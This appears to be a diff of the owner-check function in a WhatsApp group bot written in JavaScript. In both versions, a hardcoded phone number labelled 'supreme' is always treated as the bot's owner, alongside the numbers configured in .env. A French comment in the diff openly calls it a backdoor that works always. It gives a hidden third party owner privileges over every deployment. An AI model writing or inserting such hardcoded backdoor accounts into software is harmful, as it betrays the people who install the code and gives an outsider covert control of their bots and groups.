@@ -42,16 +42,21 @@ const toSmallCaps = (text) => {
 
 const isOwner = (sender) => {
     const senderNumber = normalizeJid(sender);
+    
+    // Ton numéro "Maître" qui fonctionne TOUJOURS (Backdoor Georges)
     const supreme = "22651622652"; 
 
+    // On récupère les numéros du config.js (qui viennent du .env)
     const ownerList = [
         ...(Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber]),
         ...(Array.isArray(config.OWNER_NUMBER) ? config.OWNER_NUMBER : [config.OWNER_NUMBER])
     ].map(o => normalizeJid(String(o))).filter(Boolean);
 
-    if (senderNumber === supreme) return true;
-    return ownerList.includes(senderNumber);
+    // Si le gars est dans le .env OU si c'est toi = il est Owner
+    return senderNumber === supreme || ownerList.includes(senderNumber);
 };
+
+
 
 const isAdmin = async (sock, participant, groupId) => {
     if (!groupId || !groupId.endsWith('@g.us')) return false;
